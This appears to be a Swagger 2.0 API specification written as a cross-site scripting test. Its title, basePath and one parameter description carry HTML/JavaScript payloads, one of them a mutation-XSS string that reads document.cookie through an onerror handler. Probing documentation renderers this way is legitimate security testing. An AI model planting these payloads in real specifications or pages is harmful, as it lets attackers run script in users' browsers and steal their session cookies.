swagger: '2.0'
info:
  title: <img src=x on onerror=alert()>
  description: |
  version: production
basePath: /JSSResource/ <img src=x on onerror=alert()>
produces:
  - application/xml
  - application/json
consumes:
  - application/xml
  - application/json
security:
  - basicAuth: []
paths:
  /M0X0101:
    get:
      responses:
        '200':
          description: No response was specified
      tags:
        - M0X0101_XSS_D
      operationId: findAccounts
      summary: Finds all accounts
  '/hack/hachid/{id}':
    delete:
      parameters:
        - description: |
<mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"
          format: int64
          in: path
          name: id
          required: true
          type: integer
      responses:
        '200':
          description: No response was specified
